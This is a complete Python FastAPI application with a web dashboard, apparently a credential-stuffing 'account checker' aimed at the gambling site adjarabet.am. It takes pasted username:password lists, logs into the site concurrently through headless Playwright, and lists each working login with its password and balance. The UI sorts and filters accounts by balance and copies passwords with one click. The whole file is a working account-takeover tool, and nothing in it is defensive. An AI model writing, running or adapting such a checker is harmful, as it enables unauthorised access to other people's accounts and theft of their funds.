import asyncio
import json
import logging
import os
import re
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import List, Dict, Optional
from contextlib import asynccontextmanager
from collections import deque
import time

import aiofiles
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

# ================= CONFIG =================
CONFIG = {
    "port": int(os.getenv("PORT", 8000)),
    "host": os.getenv("HOST", "0.0.0.0"),
    "headless": os.getenv("HEADLESS", "true").lower() == "true",
    "timeout_nav": int(os.getenv("TIMEOUT_NAV", 8000)),
    "timeout_element": int(os.getenv("TIMEOUT_ELEMENT", 4000)),
    "max_retries": int(os.getenv("MAX_RETRIES", 1)),
    "concurrent_limit": int(os.getenv("CONCURRENT_LIMIT", 12)),
    "delay_between": float(os.getenv("DELAY_BETWEEN", 0.3)),
}

logging.basicConfig(
    level=getattr(logging, os.getenv("LOG_LEVEL", "INFO")),
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("AdjarabetBot")

class AccountStatus(Enum):
    SUCCESS = "✅"
    FAILED = "❌"
    TIMEOUT = "⏰"

@dataclass
class Account:
    username: str
    password: str
    status: AccountStatus = AccountStatus.FAILED
    balance: str = "0 ֏"
    balance_value: float = 0.0
    error: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "username": self.username,
            "password": self.password,
            "balance": self.balance,
            "balance_value": self.balance_value,
            "status": self.status.value,
            "error": self.error[:80],
            "timestamp": self.timestamp
        }

class ConnectionManager:
    def __init__(self):
        self.active: List[WebSocket] = []

    async def connect(self, ws: WebSocket):
        await ws.accept()
        self.active.append(ws)

    def disconnect(self, ws: WebSocket):
        if ws in self.active:
            self.active.remove(ws)

    async def broadcast(self, msg: str):
        dead = []
        for ws in self.active:
            try:
                await ws.send_text(msg)
            except:
                dead.append(ws)
        for ws in dead:
            self.disconnect(ws)

class RateLimiter:
    __slots__ = ('max_req', 'window', 'timestamps')
    def __init__(self, max_req: int = 6, window: float = 8.0):
        self.max_req = max_req
        self.window = window
        self.timestamps = deque()
    
    async def acquire(self):
        now = time.time()
        while self.timestamps and self.timestamps[0] < now - self.window:
            self.timestamps.popleft()
        if len(self.timestamps) >= self.max_req:
            wait = self.window - (now - self.timestamps[0])
            if wait > 0:
                await asyncio.sleep(wait)
        self.timestamps.append(time.time())

class Bot:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.results: List[Account] = []
        self.semaphore = asyncio.Semaphore(CONFIG["concurrent_limit"])
        self.rate_limiter = RateLimiter()
        self._running = False

    async def init(self):
        logger.info("Starting browser...")
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(
            headless=CONFIG["headless"],
            args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
        )
        self._running = True
        logger.info("✓ Browser ready")
        return True

    async def cleanup(self):
        self._running = False
        if self.browser:
            try:
                await self.browser.close()
            except:
                pass
        if self.playwright:
            try:
                await self.playwright.stop()
            except:
                pass

    def _parse_balance(self, text: str) -> tuple:
        try:
            text = text.replace(',', '').replace('֏', '').replace('GEL', '').replace('₾', '').strip()
            m = re.search(r'(\d+(?:\.\d+)?)', text)
            if m:
                val = float(m.group(1))
                return f"{val:,.2f} ֏", val
        except:
            pass
        return "0 ֏", 0.0

    async def _login_one(self, acc: Account) -> Account:
        ctx = None
        page = None
        try:
            await self.rate_limiter.acquire()
            ctx = await self.browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                ignore_https_errors=True
            )
            page = await ctx.new_page()
            page.set_default_timeout(CONFIG["timeout_nav"])
            
            for attempt in range(CONFIG["max_retries"] + 1):
                if not self._running:
                    return acc
                try:
                    await page.goto('https://www.adjarabet.am/hy', wait_until='domcontentloaded')
                    await asyncio.sleep(0.3)
                    
                    try:
                        bal_el = await page.wait_for_selector('[data-test-id="header-user-balance"]', timeout=2500)
                        if bal_el:
                            txt = await bal_el.inner_text()
                            acc.balance, acc.balance_value = self._parse_balance(txt)
                            acc.status = AccountStatus.SUCCESS
                            logger.info(f"✅ {acc.username} | {acc.balance}")
                            return acc
                    except:
                        pass
                    
                    await page.fill('input[name="userIdentifier"]', acc.username, timeout=CONFIG["timeout_element"])
                    await page.fill('input[type="password"]', acc.password, timeout=CONFIG["timeout_element"])
                    await page.click('[data-test-id="header-login-button"]')
                    
                    bal_el = await page.wait_for_selector('[data-test-id="header-user-balance"]', timeout=CONFIG["timeout_nav"])
                    txt = await bal_el.inner_text()
                    acc.balance, acc.balance_value = self._parse_balance(txt)
                    acc.status = AccountStatus.SUCCESS
                    logger.info(f"✅ {acc.username} | {acc.balance}")
                    return acc
                    
                except PlaywrightTimeout:
                    if attempt == CONFIG["max_retries"]:
                        acc.status = AccountStatus.TIMEOUT
                        acc.error = "Response timeout"
                        logger.warning(f"⏰ {acc.username} - timeout")
                    else:
                        await asyncio.sleep(1.5)
                        continue
                except Exception as e:
                    if attempt == CONFIG["max_retries"]:
                        acc.status = AccountStatus.FAILED
                        acc.error = str(e)[:60]
                        logger.error(f"❌ {acc.username}: {str(e)[:50]}")
                    else:
                        await asyncio.sleep(1.5)
                        continue
            return acc
            
        except Exception as e:
            acc.status = AccountStatus.FAILED
            acc.error = str(e)[:60]
            return acc
        finally:
            if page:
                try:
                    await page.close()
                except:
                    pass
            if ctx:
                try:
                    await ctx.close()
                except:
                    pass

    async def process_all(self, accounts: List[Account], manager: ConnectionManager):
        self.results = []
        total = len(accounts)
        start_time = time.time()
        
        logger.info(f"▶ Processing {total} accounts (concurrent={CONFIG['concurrent_limit']})")
        await manager.broadcast("STATUS:started")
        await manager.broadcast(f"PROGRESS:0/{total}")

        async def worker(acc: Account):
            async with self.semaphore:
                res = await self._login_one(acc)
                self.results.append(res)
                await manager.broadcast(f"RESULT:{json.dumps(res.to_dict())}")
                await manager.broadcast(f"PROGRESS:{len(self.results)}/{total}")
                return res

        tasks = []
        for i, acc in enumerate(accounts):
            if not self._running:
                break
            tasks.append(asyncio.create_task(worker(acc)))
            if (i + 1) % CONFIG["concurrent_limit"] == 0:
                await asyncio.sleep(CONFIG["delay_between"])

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

        await self._save_results()
        
        elapsed = time.time() - start_time
        success = sum(1 for r in self.results if r.status == AccountStatus.SUCCESS)
        fail = sum(1 for r in self.results if r.status == AccountStatus.FAILED)
        to = sum(1 for r in self.results if r.status == AccountStatus.TIMEOUT)
        
        rate_per_sec = total / elapsed if elapsed > 0 else 0
        logger.info(f"📊 Complete: {elapsed:.1f}s | {rate_per_sec:.2f} acc/sec | ✅{success} ❌{fail} ⏰{to}")
        await manager.broadcast(f"SUMMARY:{success}/{total}:{success/total*100:.1f}")
        await manager.broadcast("STATUS:stopped")

    async def _save_results(self):
        try:
            Path("results").mkdir(exist_ok=True)
            data = [r.to_dict() for r in self.results]
            async with aiofiles.open("results/results.json", "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2, ensure_ascii=False))
        except Exception as e:
            logger.error(f"Save error: {e}")

    async def get_results(self) -> List[Dict]:
        if self.results:
            return [r.to_dict() for r in self.results]
        try:
            p = Path("results/results.json")
            if p.exists():
                async with aiofiles.open(p, "r", encoding="utf-8") as f:
                    return json.loads(await f.read())
        except:
            pass
        return []
    
    async def clear_results(self):
        self.results = []
        Path("results/results.json").unlink(missing_ok=True)

manager = ConnectionManager()
bot = Bot()
processing_task: Optional[asyncio.Task] = None

# FINAL HTML UI - COPY FIXED + NO SCROLL
HTML_UI = '''<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adjarabet Bot | Ultimate</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: linear-gradient(135deg, #0a0c10 0%, #0d1117 100%); color: #e6edf3; font-family: 'Inter', sans-serif; padding: 24px; min-height: 100vh; }
        .container { max-width: 1600px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, rgba(22,27,34,0.95), rgba(13,17,23,0.95)); backdrop-filter: blur(10px); border-radius: 20px; padding: 16px 28px; margin-bottom: 24px; border: 1px solid rgba(48,54,61,0.5); text-align: center; }
        .header h1 { font-size: 28px; font-weight: 700; background: linear-gradient(135deg, #58a6ff, #3fb950, #f0883e); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .header-sub { font-size: 13px; color: #8b949e; margin-top: 6px; }
        .results-section { background: #161b22; border-radius: 24px; border: 1px solid #30363d; overflow: hidden; margin-bottom: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .section-header { padding: 18px 24px; background: linear-gradient(135deg, #0d1117, #0a0c10); border-bottom: 1px solid #30363d; font-weight: 700; font-size: 18px; }
        .section-header i { color: #58a6ff; margin-right: 10px; }
        .filter-bar { display: flex; gap: 12px; padding: 16px 24px; background: #0d1117; border-bottom: 1px solid #21262d; flex-wrap: wrap; align-items: center; }
        .search-input { padding: 8px 16px; background: #010409; border: 1px solid #30363d; border-radius: 40px; color: white; width: 240px; font-size: 13px; transition: all 0.2s; }
        .search-input:focus { outline: none; border-color: #58a6ff; box-shadow: 0 0 0 2px rgba(88,166,255,0.2); }
        .filter-btn { padding: 6px 16px; background: #21262d; border: none; border-radius: 40px; color: #8b949e; cursor: pointer; font-size: 12px; font-weight: 500; transition: all 0.2s; }
        .filter-btn.active { background: #58a6ff; color: white; }
        .filter-btn:hover:not(.active) { background: #30363d; color: #e6edf3; }
        .balance-filter { display: flex; gap: 8px; margin-left: auto; }
        .balance-filter-btn { padding: 5px 12px; background: #21262d; border: none; border-radius: 40px; color: #8b949e; cursor: pointer; font-size: 11px; transition: all 0.2s; }
        .balance-filter-btn.active { background: #3fb950; color: white; }
        .table-container { max-height: 550px; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #0d1117; padding: 14px 16px; text-align: left; font-size: 13px; font-weight: 600; color: #8b949e; cursor: pointer; position: sticky; top: 0; border-bottom: 1px solid #30363d; }
        th:hover { color: #58a6ff; }
        td { padding: 12px 16px; border-bottom: 1px solid #21262d; font-size: 13px; }
        .balance-positive { color: #3fb950; font-weight: 700; }
        .balance-medium { color: #d29922; font-weight: 600; }
        .balance-zero { color: #f85149; }
        .copy-btn { background: transparent; border: none; color: #58a6ff; cursor: pointer; font-size: 13px; margin-left: 10px; padding: 4px 8px; border-radius: 6px; transition: all 0.2s; display: inline-flex; align-items: center; gap: 4px; }
        .copy-btn:hover { background: #30363d; color: #3fb950; transform: scale(1.05); }
        .copy-btn.copied { color: #3fb950; }
        .username-cell, .password-cell { display: flex; align-items: center; justify-content: space-between; gap: 8px; flex-wrap: wrap; }
        .bottom-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 24px; }
        .card { background: #161b22; border-radius: 20px; border: 1px solid #30363d; overflow: hidden; }
        .card-header { padding: 14px 20px; background: #0d1117; border-bottom: 1px solid #30363d; font-weight: 600; font-size: 14px; }
        .card-header i { color: #58a6ff; margin-right: 8px; }
        textarea { width: 100%; min-height: 240px; background: #010409; border: none; padding: 16px; color: #e6edf3; font-family: 'Courier New', monospace; font-size: 12px; resize: vertical; }
        textarea:focus { outline: none; background: #0a0c10; }
        .button-group { padding: 16px; display: flex; gap: 10px; flex-wrap: wrap; border-top: 1px solid #21262d; }
        .btn { padding: 8px 18px; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; transition: all 0.2s; font-size: 13px; }
        .btn-primary { background: linear-gradient(135deg, #238636, #2ea043); color: white; }
        .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(35,134,54,0.3); }
        .btn-danger { background: linear-gradient(135deg, #da3633, #f85149); color: white; }
        .btn-danger:hover { transform: translateY(-1px); }
        .btn-secondary { background: #6e7681; color: white; }
        .btn-secondary:hover { background: #8b949e; }
        .terminal { background: #010409; height: 320px; overflow-y: auto; padding: 12px; font-family: 'Courier New', monospace; font-size: 11px; }
        .terminal-line { padding: 5px 0; color: #b1bac4; border-bottom: 1px solid #1a1f2e; }
        .terminal-line .time { color: #58a6ff; margin-right: 12px; }
        .progress-bar { height: 3px; background: #21262d; border-radius: 3px; overflow: hidden; margin-top: 14px; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #3fb950, #58a6ff); width: 0%; transition: width 0.3s ease; }
        .stats-bottom { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-top: 0; }
        .stat-card { background: linear-gradient(135deg, #161b22, #0d1117); border-radius: 20px; padding: 20px; text-align: center; cursor: pointer; border: 1px solid #30363d; transition: all 0.3s ease; }
        .stat-card:hover { transform: translateY(-3px); border-color: #58a6ff; background: #1a1f2e; box-shadow: 0 8px 24px rgba(88,166,255,0.15); }
        .stat-number { font-size: 36px; font-weight: 800; color: #58a6ff; }
        .stat-label { font-size: 12px; color: #8b949e; margin-top: 6px; font-weight: 500; }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #161b22; border-radius: 4px; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #58a6ff; }
        @media (max-width: 900px) { body { padding: 16px; } .bottom-grid { grid-template-columns: 1fr; } .stats-bottom { grid-template-columns: repeat(2, 1fr); } .balance-filter { margin-left: 0; margin-top: 10px; } .filter-bar { flex-direction: column; align-items: stretch; } .search-input { width: 100%; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><i class="fas fa-crown"></i> Adjarabet Bot Ultimate v20.0</h1>
        <div class="header-sub">⚡ High-performance account checker | Real-time results | Premium design | One-click copy</div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    </div>

    <div class="results-section">
        <div class="section-header">
            <i class="fas fa-chart-line"></i> Results Dashboard
            <span style="font-size: 12px; color: #6e7681; margin-left: 10px;">▼ Click headers to sort | 📋 Click copy buttons</span>
        </div>
        <div class="filter-bar">
            <input type="text" id="searchInput" class="search-input" placeholder="🔍 Search by username...">
            <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">All</button>
            <button class="filter-btn" data-filter="success" onclick="setFilter('success')">✅ Success</button>
            <button class="filter-btn" data-filter="failed" onclick="setFilter('failed')">❌ Failed</button>
            <button class="filter-btn" data-filter="timeout" onclick="setFilter('timeout')">⏰ Timeout</button>
            <div class="balance-filter">
                <span style="font-size: 12px; color: #8b949e;">💰 Balance:</span>
                <button class="balance-filter-btn active" data-balance="all" onclick="setBalanceFilter('all')">All</button>
                <button class="balance-filter-btn" data-balance="low" onclick="setBalanceFilter('low')">&lt; 10֏</button>
                <button class="balance-filter-btn" data-balance="mid" onclick="setBalanceFilter('mid')">10-100֏</button>
                <button class="balance-filter-btn" data-balance="high" onclick="setBalanceFilter('high')">100+ ֏</button>
            </div>
        </div>
        <div class="table-container">
            <table id="resultsTable">
                <thead><tr><th onclick="sortBy('status')"><i class="fas fa-flag"></i> Status</th><th onclick="sortBy('username')"><i class="fas fa-user"></i> Username</th><th onclick="sortBy('password')"><i class="fas fa-key"></i> Password</th><th onclick="sortBy('balance')"><i class="fas fa-coins"></i> Balance</th><th><i class="fas fa-exclamation-triangle"></i> Error</th></tr></thead>
                <tbody id="resultsBody"><tr><td colspan="5" style="text-align: center; padding: 60px;"><i class="fas fa-spinner fa-pulse"></i> Waiting for results...</td></tr></tbody>
            </table>
        </div>
    </div>

    <div class="bottom-grid">
        <div class="card">
            <div class="card-header"><i class="fas fa-users"></i> Accounts Input (username:password)</div>
            <textarea id="accounts" placeholder="user1:pass123&#10;user2:pass456&#10;user3:pass789"></textarea>
            <div class="button-group">
                <button class="btn btn-primary" onclick="startBot()"><i class="fas fa-play"></i> Start</button>
                <button class="btn btn-danger" onclick="stopBot()"><i class="fas fa-stop"></i> Stop</button>
                <button class="btn btn-secondary" onclick="clearAccounts()"><i class="fas fa-trash"></i> Clear Input</button>
                <button class="btn btn-secondary" onclick="clearResults()"><i class="fas fa-eraser"></i> Clear Results</button>
            </div>
        </div>
        <div class="card">
            <div class="card-header"><i class="fas fa-terminal"></i> Live Console</div>
            <div class="terminal" id="terminal"><div class="terminal-line"><span class="time">●</span> 🚀 Adjarabet Bot Ultimate v20.0</div><div class="terminal-line"><span class="time">●</span> 💡 Click 📋 to copy username/password</div><div class="terminal-line"><span class="time">●</span> ⚡ Concurrent: 5 accounts | 8s timeout</div></div>
        </div>
    </div>

    <div class="stats-bottom">
        <div class="stat-card" onclick="setFilter('all')"><div class="stat-number" id="totalCount">0</div><div class="stat-label">TOTAL ACCOUNTS</div></div>
        <div class="stat-card" onclick="setFilter('success')"><div class="stat-number" id="successCount">0</div><div class="stat-label">✅ SUCCESS</div></div>
        <div class="stat-card" onclick="setFilter('failed')"><div class="stat-number" id="failedCount">0</div><div class="stat-label">❌ FAILED</div></div>
        <div class="stat-card" onclick="setFilter('timeout')"><div class="stat-number" id="timeoutCount">0</div><div class="stat-label">⏰ TIMEOUT</div></div>
    </div>
</div>

<script>
let ws = null, allResults = [], currentFilter = 'all', currentBalanceFilter = 'all', currentSort = { field: 'balance', dir: 'desc' };

function connect() {
    ws = new WebSocket(`ws://${window.location.host}/ws`);
    ws.onopen = () => addLog('🟢 Connected to server');
    ws.onmessage = (e) => {
        let data = e.data;
        if (data.startsWith('RESULT:')) {
            try {
                let result = JSON.parse(data.substring(7));
                let idx = allResults.findIndex(x => x.username === result.username);
                if (idx >= 0) allResults[idx] = result;
                else allResults.push(result);
                renderResults();
                updateStats();
                addLog(`${result.status} ${result.username.padEnd(20)} | ${result.balance}`);
            } catch(e) {}
        } else if (data.startsWith('PROGRESS:')) {
            let p = data.substring(9).split('/');
            let percent = (p[0]/p[1]*100) || 0;
            document.getElementById('progressFill').style.width = percent + '%';
        } else if (data.startsWith('SUMMARY:')) {
            addLog('📊 ' + data.substring(8));
        } else if (!data.startsWith('STATUS:')) {
            addLog(data);
        }
    };
    ws.onclose = () => { addLog('🔴 Disconnected, reconnecting...'); setTimeout(connect, 3000); };
}

async function copyToClipboard(text, type, btnElement) {
    try {
        await navigator.clipboard.writeText(text);
        const originalHtml = btnElement.innerHTML;
        btnElement.innerHTML = '<i class="fas fa-check"></i> <span>✓</span>';
        btnElement.classList.add('copied');
        addLog(`📋 Copied ${type}: ${text.substring(0, 30)}${text.length > 30 ? '...' : ''}`);
        setTimeout(() => {
            btnElement.innerHTML = originalHtml;
            btnElement.classList.remove('copied');
        }, 1500);
    } catch(err) {
        console.error('Copy failed:', err);
        addLog(`❌ Failed to copy ${type}`);
        // Fallback method
        const textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        addLog(`📋 Copied ${type} (fallback): ${text.substring(0, 30)}${text.length > 30 ? '...' : ''}`);
    }
}

function getBalanceCategory(val) {
    let num = parseFloat(val) || 0;
    if (num < 10) return 'low';
    if (num >= 10 && num <= 100) return 'mid';
    return 'high';
}

function renderResults() {
    let filtered = allResults.filter(r => {
        if (currentFilter !== 'all') {
            if (currentFilter === 'success' && r.status !== '✅') return false;
            if (currentFilter === 'failed' && r.status !== '❌') return false;
            if (currentFilter === 'timeout' && r.status !== '⏰') return false;
        }
        if (currentBalanceFilter !== 'all') {
            let cat = getBalanceCategory(r.balance_value);
            if (cat !== currentBalanceFilter) return false;
        }
        return true;
    });
    
    let search = document.getElementById('searchInput')?.value.toLowerCase() || '';
    if (search) {
        filtered = filtered.filter(r => (r.username || '').toLowerCase().includes(search));
    }
    
    filtered.sort((a,b) => {
        let av = currentSort.field === 'balance' ? (a.balance_value || 0) : (a[currentSort.field] || '').toString().toLowerCase();
        let bv = currentSort.field === 'balance' ? (b.balance_value || 0) : (b[currentSort.field] || '').toString().toLowerCase();
        if (typeof av === 'number') {
            return currentSort.dir === 'asc' ? av - bv : bv - av;
        }
        return currentSort.dir === 'asc' ? (av > bv ? 1 : -1) : (av < bv ? 1 : -1);
    });
    
    let balanceClass = (val) => {
        let num = parseFloat(val) || 0;
        if (num > 100) return 'balance-positive';
        if (num > 10) return 'balance-medium';
        return 'balance-zero';
    };
    
    document.getElementById('resultsBody').innerHTML = filtered.map(r => `
        <tr>
            <td style="font-size: 20px;">${r.status}</td>
            <td><div class="username-cell"><span class="username-text"><strong style="color: #58a6ff;">${escapeHtml(r.username)}</strong></span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(r.username).replace(/'/g, "\\'")}', 'username', this)" title="Copy username"><i class="fas fa-copy"></i> Copy</button></div></td>
            <td><div class="password-cell"><span class="password-text">${escapeHtml(r.password)}</span><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(r.password).replace(/'/g, "\\'")}', 'password', this)" title="Copy password"><i class="fas fa-key"></i> Copy</button></div></td>
            <td class="${balanceClass(r.balance_value)}" style="font-weight: 600;">${r.balance || '0 ֏'}</td>
            <td style="color: #8b949e; font-size: 11px;">${escapeHtml(r.error || '-')}</td>
        </tr>
    `).join('');
    
    if (filtered.length === 0 && allResults.length > 0) {
        document.getElementById('resultsBody').innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 40px;"><i class="fas fa-search"></i> No matching results</td></tr>';
    }
}

function updateStats() {
    document.getElementById('totalCount').innerText = allResults.length;
    document.getElementById('successCount').innerText = allResults.filter(r => r.status === '✅').length;
    document.getElementById('failedCount').innerText = allResults.filter(r => r.status === '❌').length;
    document.getElementById('timeoutCount').innerText = allResults.filter(r => r.status === '⏰').length;
}

function sortBy(field) {
    if (currentSort.field === field) {
        currentSort.dir = currentSort.dir === 'asc' ? 'desc' : 'asc';
    } else {
        currentSort.field = field;
        currentSort.dir = field === 'balance' ? 'desc' : 'asc';
    }
    renderResults();
}

function setFilter(f) { 
    currentFilter = f; 
    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.filter === f));
    renderResults(); 
}

function setBalanceFilter(f) {
    currentBalanceFilter = f;
    document.querySelectorAll('.balance-filter-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.balance === f));
    renderResults();
}

function escapeHtml(s) { 
    if (!s) return ''; 
    return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); 
}

function addLog(msg) { 
    let term = document.getElementById('terminal'); 
    let div = document.createElement('div'); 
    div.className = 'terminal-line'; 
    div.innerHTML = `<span class="time">[${new Date().toLocaleTimeString()}]</span> ${msg}`; 
    term.appendChild(div); 
     //  div.scrollIntoView(); // 
    if(term.children.length > 300) term.removeChild(term.firstChild); 
}

async function startBot() { 
    let acc = document.getElementById('accounts').value; 
    if(!acc.trim()) { addLog('❌ Please enter accounts first'); return; } 
    addLog('🚀 Starting bot...'); 
    try {
        let res = await fetch('/start', {method:'POST', body: acc});
        let data = await res.json();
        if(data.status === 'started') {
            addLog(`✓ Started processing ${data.total} accounts`);
        }
    } catch(e) { addLog('❌ Start failed: ' + e.message); }
}

async function stopBot() { 
    addLog('⏹ Stopping...'); 
    await fetch('/stop', {method:'POST'}); 
}

async function clearResults() {
    if(confirm('Clear all results? This cannot be undone.')) {
        await fetch('/clear_results', {method:'POST'});
        allResults = [];
        renderResults();
        updateStats();
        addLog('🗑 All results cleared');
    }
}

function clearAccounts() { 
    document.getElementById('accounts').value = ''; 
    addLog('🗑 Accounts input cleared'); 
}

document.getElementById('accounts').value = localStorage.getItem('bot_accounts') || '';
document.getElementById('accounts').addEventListener('input', () => localStorage.setItem('bot_accounts', document.getElementById('accounts').value));
document.getElementById('searchInput').addEventListener('input', () => renderResults());

connect();
setInterval(async () => {
    try { 
        let r = await fetch('/results'); 
        let d = await r.json(); 
        if(d.length !== allResults.length) { 
            allResults = d; 
            renderResults(); 
            updateStats(); 
        } 
    } catch(e) {}
}, 5000);
</script>
</body>
</html>'''

@asynccontextmanager
async def lifespan(app: FastAPI):
    await bot.init()
    logger.info("=" * 50)
    logger.info("🎮 ADJARABET BOT v20.0 - ULTIMATE FINAL")
    logger.info(f"📍 Host: {CONFIG['host']}:{CONFIG['port']}")
    logger.info(f"⚡ Concurrent: {CONFIG['concurrent_limit']} | Timeout: {CONFIG['timeout_nav']}ms")
    logger.info("=" * 50)
    yield
    if processing_task and not processing_task.done():
        processing_task.cancel()
    await bot.cleanup()

app = FastAPI(title="Adjarabet Bot Ultimate", version="20.0", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.get("/")
async def root():
    return HTMLResponse(HTML_UI)

@app.post("/start")
async def start_bot(req: Request):
    global processing_task
    body = (await req.body()).decode()
    accounts = []
    for line in body.splitlines():
        line = line.strip()
        if line and not line.startswith('#') and ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                accounts.append(Account(parts[0].strip(), parts[1].strip()))
    if not accounts:
        return JSONResponse({"error": "No valid accounts (format: username:password)"}, 400)
    if processing_task and not processing_task.done():
        processing_task.cancel()
    processing_task = asyncio.create_task(bot.process_all(accounts, manager))
    return {"status": "started", "total": len(accounts)}

@app.post("/stop")
async def stop_bot():
    global processing_task
    if processing_task and not processing_task.done():
        processing_task.cancel()
    await manager.broadcast("STATUS:stopped")
    return {"status": "stopped"}

@app.post("/clear_results")
async def clear_results():
    await bot.clear_results()
    await manager.broadcast("CLEAR_RESULTS")
    return {"status": "cleared"}

@app.get("/results")
async def get_results():
    return await bot.get_results()

@app.get("/health")
async def health():
    return {"status": "healthy", "bot_running": bot._running, "total_processed": len(bot.results), "timestamp": datetime.now().isoformat()}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            try:
                await asyncio.wait_for(websocket.receive_text(), timeout=60)
            except asyncio.TimeoutError:
                try:
                    await websocket.send_text("ping")
                except:
                    break
    except (WebSocketDisconnect, Exception):
        manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    Path("results").mkdir(exist_ok=True)
    print("\n" + "=" * 60)
    print("🎮 ADJARABET BOT v20.0 - ULTIMATE FINAL")
    print("=" * 60)
    print(f"📍 Web UI: http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"🔧 Headless: {CONFIG['headless']}")
    print(f"⚡ Concurrent: {CONFIG['concurrent_limit']} accounts")
    print(f"📋 Copy buttons FIXED | 🔍 Search field | ✅ No scroll on start")
    print("=" * 60 + "\n")
    uvicorn.run(app, host=CONFIG["host"], port=CONFIG["port"], log_level="warning", access_log=False)
